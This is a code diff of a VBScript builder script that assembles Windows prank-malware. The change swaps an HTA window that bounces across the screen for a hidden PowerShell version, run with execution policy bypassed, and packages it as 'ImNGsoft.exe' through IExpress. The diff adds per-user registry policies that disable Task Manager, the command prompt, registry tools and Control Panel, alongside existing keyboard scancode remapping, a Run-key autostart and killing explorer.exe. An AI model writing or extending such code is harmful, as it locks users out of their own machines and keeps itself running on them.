@@ -90,7 +90,7 @@ ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" notice"
 ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" alarm"
 ts.WriteLine ")"
 ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
-ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" mshta.exe ""%DEST%\ImNGsoft.hta"")"
+ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEST%\bounce.ps1"")"
 ts.WriteLine ")"
 ts.WriteLine "if not exist ""%DEST%\lol.run"" ("
 ts.WriteLine "    >""%DEST%\lol.run"" echo ."
@@ -122,7 +122,7 @@ ts.WriteLine "del ""%DEST%\hb2.tmp"" 2>nul"
 ts.WriteLine "ping -n 8 127.0.0.1 >nul"
 ts.WriteLine "if not exist ""%DEST%\hb1.tmp"" start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\Start.bat"" resume"
 ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
-ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" mshta.exe ""%DEST%\ImNGsoft.hta"")"
+ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEST%\bounce.ps1"")"
 ts.WriteLine ")"
 ts.WriteLine "taskkill /f /im explorer.exe >nul 2>nul"
 ts.WriteLine "ping -n 4 127.0.0.1 >nul"
@@ -180,39 +180,47 @@ ts.WriteLine "End Select"
 ts.Close
 If Err.Number <> 0 Then Die "payload.vbs"
 
-' ============================================================ ImNGsoft.hta
-Set ts = fso.CreateTextFile(build & "\ImNGsoft.hta", True, False)
-ts.WriteLine "<html>"
-ts.WriteLine "<head>"
-ts.WriteLine "<hta:application id=""ng"" caption=""no"" border=""none"" scroll=""no"" innerborder=""no"" selection=""no"" maximizebutton=""no"" contextmenu=""no"" />"
-ts.WriteLine "<style>"
-ts.WriteLine "html,body{margin:0;overflow:hidden;background:#c00000;font-family:""MS Gothic"",monospace}"
-ts.WriteLine "#t{writing-mode:tb-rl;color:#fff;font-size:60px;font-weight:bold;letter-spacing:6px}"
-ts.WriteLine "</style>"
-ts.WriteLine "</head>"
-ts.WriteLine "<body><div id=""t"">NG!NG!NG</div>"
-ts.WriteLine "<script>"
-ts.WriteLine "var HB=""" & Replace(DEST, "\", "\\") & "\\hb2.tmp"";"
-ts.WriteLine "var W=130,H=470,x=120,y=120,dx=6,dy=4,n=0,mx=0,my=0;"
-ts.WriteLine "window.resizeTo(W,H);"
-ts.WriteLine "mx=Math.max(0,screen.availWidth-W); my=Math.max(0,screen.availHeight-H);"
-ts.WriteLine "function tick(){"
-ts.WriteLine "  x+=dx; y+=dy;"
-ts.WriteLine "  if(x<0){x=0;dx=-dx;} else if(x>mx){x=mx;dx=-dx;}"
-ts.WriteLine "  if(y<0){y=0;dy=-dy;} else if(y>my){y=my;dy=-dy;}"
-ts.WriteLine "  window.moveTo(x,y);"
-ts.WriteLine "  if(++n%25==0){"
-ts.WriteLine "    try{"
-ts.WriteLine "      var fso=new ActiveXObject(""Scripting.FileSystemObject"");"
-ts.WriteLine "      var f=fso.CreateTextFile(HB,true); f.Write("".""); f.Close();"
-ts.WriteLine "    }catch(e){}"
-ts.WriteLine "  }"
+' ============================================================ bounce.ps1
+Set ts = fso.CreateTextFile(build & "\bounce.ps1", True, False)
+ts.WriteLine "Add-Type -AssemblyName System.Windows.Forms"
+ts.WriteLine "Add-Type -AssemblyName System.Drawing"
+ts.WriteLine "$HB = '" & DEST & "\hb2.tmp'"
+ts.WriteLine "$W = 130; $H = 470"
+ts.WriteLine "$f = New-Object System.Windows.Forms.Form"
+ts.WriteLine "$f.FormBorderStyle = 'None'"
+ts.WriteLine "$f.TopMost = $true"
+ts.WriteLine "$f.BackColor = [System.Drawing.Color]::FromArgb(192,0,0)"
+ts.WriteLine "$f.ClientSize = New-Object System.Drawing.Size($W,$H)"
+ts.WriteLine "$f.StartPosition = 'Manual'"
+ts.WriteLine "$f.ShowInTaskbar = $false"
+ts.WriteLine "$l = New-Object System.Windows.Forms.Label"
+ts.WriteLine "$l.Dock = 'Fill'"
+ts.WriteLine "$l.ForeColor = [System.Drawing.Color]::White"
+ts.WriteLine "$l.Font = New-Object System.Drawing.Font('MS Gothic',60,[System.Drawing.FontStyle]::Bold)"
+ts.WriteLine "$l.TextAlign = 'MiddleCenter'"
+ts.WriteLine "$l.Text = ""N`r`nG`r`n!`r`nN`r`nG`r`n!`r`nN`r`nG"""
+ts.WriteLine "$f.Controls.Add($l)"
+ts.WriteLine "$x = 120; $y = 120; $dx = 6; $dy = 4; $n = 0"
+ts.WriteLine "$mx = [Math]::Max(0,[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - $W)"
+ts.WriteLine "$my = [Math]::Max(0,[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height - $H)"
+ts.WriteLine "$f.Left = $x; $f.Top = $y"
+ts.WriteLine "$f.Show()"
+ts.WriteLine "$sw = [System.Diagnostics.Stopwatch]::StartNew()"
+ts.WriteLine "while ($f.Visible) {"
+ts.WriteLine "    [System.Windows.Forms.Application]::DoEvents()"
+ts.WriteLine "    if ($sw.ElapsedMilliseconds -ge 40) {"
+ts.WriteLine "        $sw.Restart()"
+ts.WriteLine "        $x += $dx; $y += $dy"
+ts.WriteLine "        if ($x -lt 0) { $x = 0; $dx = -$dx } elseif ($x -gt $mx) { $x = $mx; $dx = -$dx }"
+ts.WriteLine "        if ($y -lt 0) { $y = 0; $dy = -$dy } elseif ($y -gt $my) { $y = $my; $dy = -$dy }"
+ts.WriteLine "        $f.Left = $x; $f.Top = $y"
+ts.WriteLine "        $n++"
+ts.WriteLine "        if (($n % 25) -eq 0) { try { Set-Content -LiteralPath $HB -Value '.' } catch {} }"
+ts.WriteLine "    }"
+ts.WriteLine "    Start-Sleep -Milliseconds 10"
 ts.WriteLine "}"
-ts.WriteLine "setInterval(tick,40);"
-ts.WriteLine "</script>"
-ts.WriteLine "</body></html>"
 ts.Close
-If Err.Number <> 0 Then Die "ImNGsoft.hta"
+If Err.Number <> 0 Then Die "bounce.ps1"
 
 ' ============================================================ ImNGsoft.sed
 Set ts = fso.CreateTextFile(build & "\ImNGsoft.sed", True, False)
@@ -244,11 +252,11 @@ ts.WriteLine "DisplayLicense="
 ts.WriteLine "FinishMessage="
 ts.WriteLine "TargetName=" & build & "\ImNGsoft.exe"
 ts.WriteLine "FriendlyName=ImNGsoft"
-ts.WriteLine "AppLaunched=mshta.exe ImNGsoft.hta"
+ts.WriteLine "AppLaunched=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File bounce.ps1"
 ts.WriteLine "PostInstallCmd=<None>"
 ts.WriteLine "AdminQuietInstCmd="
 ts.WriteLine "UserQuietInstCmd="
-ts.WriteLine "FILE0=ImNGsoft.hta"
+ts.WriteLine "FILE0=bounce.ps1"
 ts.WriteLine "[SourceFiles]"
 ts.WriteLine "SourceFiles0=" & build & "\"
 ts.WriteLine "[SourceFiles0]"
@@ -262,9 +270,9 @@ If Err.Number <> 0 Then Die "RedWallPaper.bmp"
 MakeCur DEST & "\NCursor.cur"
 If Err.Number <> 0 Then Die "NCursor.cur"
 
-' ============================================================ hta copy + assemble
-fso.CopyFile build & "\ImNGsoft.hta", DEST & "\ImNGsoft.hta", True
-If Err.Number <> 0 Then Die "copy hta"
+' ============================================================ copy + assemble
+fso.CopyFile build & "\bounce.ps1", DEST & "\bounce.ps1", True
+If Err.Number <> 0 Then Die "copy ps1"
 
 ie = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\iexpress.exe"
 If Not fso.FileExists(ie) Then ie = "iexpress"
@@ -278,20 +286,30 @@ If fso.FileExists(build & "\ImNGsoft.exe") Then
 End If
 
 ' ============================================================ registry
-Dim PS, PE, RK, KL
+Dim PS, PE, HS, HE, RK, KL
 PS = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 PE = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+HS = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+HE = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
 RK = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 KL = "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout"
 
 sh.RegWrite PS & "\DisableTaskMgr", 1, "REG_DWORD"
+sh.RegWrite HS & "\DisableTaskMgr", 1, "REG_DWORD"
 sh.RegWrite PS & "\DisableCMD", 2, "REG_DWORD"
+sh.RegWrite HS & "\DisableCMD", 2, "REG_DWORD"
 sh.RegWrite PS & "\DisableRegistryTools", 1, "REG_DWORD"
+sh.RegWrite HS & "\DisableRegistryTools", 1, "REG_DWORD"
 sh.RegWrite PS & "\NoDispBackgroundPage", 1, "REG_DWORD"
+sh.RegWrite HS & "\NoDispBackgroundPage", 1, "REG_DWORD"
 sh.RegWrite PS & "\NoChangingWallpaper", 1, "REG_DWORD"
+sh.RegWrite HS & "\NoChangingWallpaper", 1, "REG_DWORD"
 sh.RegWrite PS & "\NoDispAppearancePage", 1, "REG_DWORD"
+sh.RegWrite HS & "\NoDispAppearancePage", 1, "REG_DWORD"
 sh.RegWrite PE & "\NoControlPanel", 1, "REG_DWORD"
+sh.RegWrite HE & "\NoControlPanel", 1, "REG_DWORD"
 sh.RegWrite PE & "\NoViewContextMenu", 1, "REG_DWORD"
+sh.RegWrite HE & "\NoViewContextMenu", 1, "REG_DWORD"
 If Err.Number <> 0 Then Die "policies"
 
 sh.RegWrite KL & "\Scancode Map", Array(0,0,0,0, 0,0,0,0, 6,0,0,0, &H22,0,&H31,0, &H31,0,&H22,0, &H18,0,&H26,0, &H26,0,&H18,0, 0,0,&H3A,0, 0,0,0,0), "REG_BINARY"
@@ -304,11 +322,15 @@ If Err.Number <> 0 Then Die "Run"
 sh.Run "rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True
 
 ' ============================================================ verify
-If Not (fso.FileExists(DEST & "\Start.bat") And fso.FileExists(DEST & "\CheckSoft.bat") _
-    And fso.FileExists(DEST & "\payload.vbs") And fso.FileExists(DEST & "\ImNGsoft.hta") _
-    And fso.FileExists(DEST & "\RedWallPaper.bmp") And fso.FileExists(DEST & "\NCursor.cur")) Then
-    MsgBox "Some files are missing in " & DEST, vbExclamation, "gen.vbs"
-End If
+Dim miss
+miss = ""
+If Not fso.FileExists(DEST & "\Start.bat") Then miss = miss & "Start.bat" & vbCrLf
+If Not fso.FileExists(DEST & "\CheckSoft.bat") Then miss = miss & "CheckSoft.bat" & vbCrLf
+If Not fso.FileExists(DEST & "\payload.vbs") Then miss = miss & "payload.vbs" & vbCrLf
+If Not fso.FileExists(DEST & "\bounce.ps1") Then miss = miss & "bounce.ps1" & vbCrLf
+If Not fso.FileExists(DEST & "\RedWallPaper.bmp") Then miss = miss & "RedWallPaper.bmp" & vbCrLf
+If Not fso.FileExists(DEST & "\NCursor.cur") Then miss = miss & "NCursor.cur" & vbCrLf
+If miss <> "" Then MsgBox "Missing files in " & DEST & vbCrLf & vbCrLf & miss, vbExclamation, "gen.vbs"
 
 ' ============================================================ cleanup + run
 fso.DeleteFolder build, True
